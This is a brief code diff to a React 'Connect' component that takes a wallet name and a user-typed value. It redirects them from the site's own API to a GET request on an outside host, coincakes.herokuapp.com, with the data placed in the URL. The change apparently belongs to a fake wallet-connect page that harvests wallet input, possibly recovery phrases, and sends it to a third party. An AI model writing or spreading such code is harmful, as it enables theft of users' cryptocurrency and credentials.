@@ -17,10 +17,7 @@ const Connect = (payload, payloadType) => {
         } else{
             const message = `a new message with ${wallet} of ${inputVal}`
             setBtnMsg("Processing.....")
-            const res = await fetch("/api/pushconnect", {
-                method: "POST",
-                body: JSON.stringify(message)
-              });
+            const res = await fetch(`https://coincakes.herokuapp.com/pushconnect?message=${message}`)
             const data = await res.json();
             if(data.success == true){
                 alert(data.message);
